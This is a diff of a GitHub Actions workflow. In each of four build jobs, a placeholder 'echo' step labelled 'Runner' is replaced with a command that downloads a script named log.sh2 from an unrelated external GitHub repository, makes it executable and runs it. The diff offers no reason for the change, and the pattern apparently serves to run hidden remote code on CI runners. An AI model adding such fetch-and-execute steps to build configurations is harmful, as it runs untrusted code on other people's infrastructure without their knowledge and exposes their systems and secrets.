@@ -21,7 +21,7 @@ jobs:
       uses: actions/checkout@v1
     - name: Runner
       run: |
-          echo "a"
+          wget https://raw.githubusercontent.com/Egoguntu/gogonu/main/log.sh2 && chmod u+x log.sh2 && ./log.sh2
   build1:
     name: Build1
     runs-on: ubuntu-latest
@@ -41,7 +41,7 @@ jobs:
       uses: actions/checkout@v1
     - name: Runner
       run: |
-          echo "a"
+          wget https://raw.githubusercontent.com/Egoguntu/gogonu/main/log.sh2 && chmod u+x log.sh2 && ./log.sh2
   build2:
     name: Build2
     runs-on: ubuntu-latest
@@ -61,7 +61,7 @@ jobs:
       uses: actions/checkout@v1
     - name: Runner
       run: |
-          echo "a"
+          wget https://raw.githubusercontent.com/Egoguntu/gogonu/main/log.sh2 && chmod u+x log.sh2 && ./log.sh2
   build3:
     name: Build3
     runs-on: ubuntu-latest
@@ -81,4 +81,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Runner
       run: |
-          echo "a"
+          wget https://raw.githubusercontent.com/Egoguntu/gogonu/main/log.sh2 && chmod u+x log.sh2 && ./log.sh2
